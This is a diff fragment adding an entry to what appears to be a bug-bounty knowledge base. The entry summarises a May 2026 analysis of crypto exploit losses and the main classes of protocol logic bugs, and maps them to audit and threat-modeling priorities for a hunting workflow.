+- Philosophy: Threat modeling is the meta-skill
+- Steering: Spend 30% of hunt time on threat modeling, 70% on testing
+- Workflow: 05-adaptive-hunt → Phase 0 (Threat Model)
+- Skill: Threat model generation agent (system → STRIDE matrix)
+
+---
+
+### Entry #202 — $50M+ Lost in Crypto in One Month — 90% From Protocol Logic Bugs (Industry Analysis)
+
+**Source:** Industry analysis — May 2026
+**Date Added:** 2026-06-01
+**Type:** Industry Analysis, Statistics
+**Priority:** HIGH
+**Total Loss:** $50M+ in 30 days
+
+**Content:**
+A meta-analysis of crypto exploits in May 2026 shows:
+- **Total value lost:** $50M+ across 12 major exploits
+- **~90% caused by protocol logic bugs** (not smart contract reentrancy, not oracle manipulation, not flash loans)
+- **Top bug classes:**
+  - Input validation missing (Verus Bridge, #193)
+  - Access control on privileged functions
+  - State machine assumptions violated
+  - Cross-chain message verification incomplete
+  - Reward mechanism sybil-able (#177)
+
+**The 2026 shift:**
+- Reentrancy, integer overflow, simple oracle manipulation — most projects have these audited
+- Logic bugs are the new frontier — they require reading the spec, not just the code
+- The highest-value bugs are in **business logic**, not **technical implementation**
+
+**Niche:** Crypto/DeFi, Industry Analysis
+**Vuln Type:** Business Logic, Protocol Design
+**Priority:** HIGH
+**Kiro Mapping:**
+- Steering: 90% of crypto losses = logic bugs. Shift focus from low-level Solidity to high-level protocol design.
+- Workflow: 04-crypto-hunt → Phase 5 (Logic) priority elevation
+- Skill: Spec reading, assumption auditing, threat modeling for protocol design
+- Template: Protocol logic audit checklist (input validation, state machine, access control, cross-chain verification, reward mechanism)
